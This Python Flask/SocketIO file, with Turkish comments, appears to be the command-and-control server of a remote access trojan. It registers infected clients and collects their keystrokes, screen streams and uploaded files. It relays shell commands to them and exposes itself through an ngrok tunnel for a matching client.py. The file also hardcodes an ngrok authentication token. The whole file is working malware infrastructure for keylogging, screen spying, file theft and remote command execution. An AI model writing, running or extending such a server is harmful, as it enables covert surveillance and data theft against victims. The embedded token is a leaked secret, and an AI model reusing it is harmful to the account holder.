import os, json
from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit
from pyngrok import ngrok # Ngrok kütüphanesini içe aktar

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# --- NGROK ENTEGRASYONU ---
NGROK_TOKEN = "384aSBphuB29Btczp9fN3k3ctmx_7zY2NiV9Yd5QF9BnhoVQY"
PORT = 8080

def setup_ngrok():
    try:
        # Tokeni ayarla
        ngrok.set_auth_token(NGROK_TOKEN)
        # 8080 portu için HTTP tüneli aç
        public_url = ngrok.connect(PORT).public_url
        print(f"\n" + "="*50)
        print(f"[*] NGROK AKTIF!")
        print(f"[*] Bağlantı Adresi: {public_url}")
        print(f"[*] client.py içindeki TARGET_URL kısmına bu adresi yazın.")
        print("="*50 + "\n")
    except Exception as e:
        print(f"[!] Ngrok başlatılamadı: {e}")

active_clients = {}

@app.route('/')
def index(): 
    return render_template('index.html')

@app.route('/upload_file', methods=['POST'])
def upload_file():
    file = request.files.get('file')
    cid = request.form.get('id', 'unknown')
    if file:
        if not os.path.exists('downloads'): os.makedirs('downloads')
        save_path = os.path.join('downloads', f"{cid}_{file.filename}")
        file.save(save_path)
        return "OK", 200
    return "FAIL", 400

@socketio.on('connect')
def handle_connect(): 
    emit('client_list', list(active_clients.keys()))

@socketio.on('register')
def handle_register(data):
    cid = data.get('id')
    active_clients[cid] = request.sid
    emit('client_list', list(active_clients.keys()), broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    for cid, sid in list(active_clients.items()):
        if sid == request.sid:
            del active_clients[cid]
            emit('client_list', list(active_clients.keys()), broadcast=True)
            break

@socketio.on('screen_data')
def handle_screen(data): 
    emit('update_screen', data, broadcast=True, include_self=False)

@socketio.on('send_command')
def handle_command(data): 
    emit('execute_command', data, broadcast=True)

@socketio.on('shell_output')
def handle_shell_output(data): 
    emit('shell_output', data, broadcast=True)

@socketio.on('key_stroke')
def handle_key(data): 
    emit('new_key', data, broadcast=True)

if __name__ == '__main__':
    # Sunucu başlamadan önce Ngrok'u çalıştır
    setup_ngrok()
    socketio.run(app, host='0.0.0.0', port=PORT, debug=False)